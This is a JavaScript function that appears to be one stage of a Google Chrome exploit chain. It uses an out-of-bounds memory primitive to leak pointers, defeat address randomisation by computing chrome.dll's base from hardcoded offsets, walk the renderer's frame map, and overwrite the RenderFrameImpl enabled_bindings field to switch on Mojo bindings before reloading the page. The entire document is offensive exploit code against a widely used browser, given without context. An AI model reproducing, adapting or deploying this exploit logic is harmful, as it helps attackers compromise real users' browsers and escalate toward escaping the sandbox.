function enable_mojo(oob){
    print("[ enable mojo ]")

    const kWindowWrapperTypeInfoOffset  = 0x7c90fb8n;
    const kGFrameMapOffset              = 0x7d47ed8n;
    const kEnabledBindingsOffset        = 0x5c0n ;

    let window_ptr = BigInt(oob.objToPtr(window));
    print("  [*] window_ptr                     : "+hex(window_ptr));

    let v8_window_wrapper_type_info_ptr = oob.getUint64(window_ptr+0x10n);
    let chrome_dll_address = v8_window_wrapper_type_info_ptr - kWindowWrapperTypeInfoOffset;
    print("  [*] chrome.dll address             : "+hex(chrome_dll_address));
    print("  [*] v8 window warpper type info ptr: "+hex(v8_window_wrapper_type_info_ptr));


    let g_frame_map_ptr = chrome_dll_address + kGFrameMapOffset;
    print("  [*] g_frame_map_ptr                : "+hex(g_frame_map_ptr))

    if (oob.getUint64(g_frame_map_ptr) != g_frame_map_ptr + 0x8n) {
        print('  [!] error finding g_frame_map');
        return;
    }

    let begin_ptr = oob.getUint64(g_frame_map_ptr+8n);
    print('  [*] begin_ptr                      : ' + begin_ptr.toString(16));

    // content::RenderFrameImpl
    render_frame_ptr = oob.getUint64(begin_ptr + 0x28n);
    print('  [*] render_frame_ptr               : ' + render_frame_ptr.toString(16));

    let enabled_bindings = oob.getUint32(render_frame_ptr + kEnabledBindingsOffset);
    print('  [*] enabled_bindings:  0b' + enabled_bindings.toString(2));
    oob.setUint32(render_frame_ptr + kEnabledBindingsOffset, 2);
    enabled_bindings = oob.getUint32(render_frame_ptr + kEnabledBindingsOffset);
    print('  [*] new enabled_bindings:  0b' + enabled_bindings.toString(2));

    print('  [*] reloading');
    window.location.reload();
}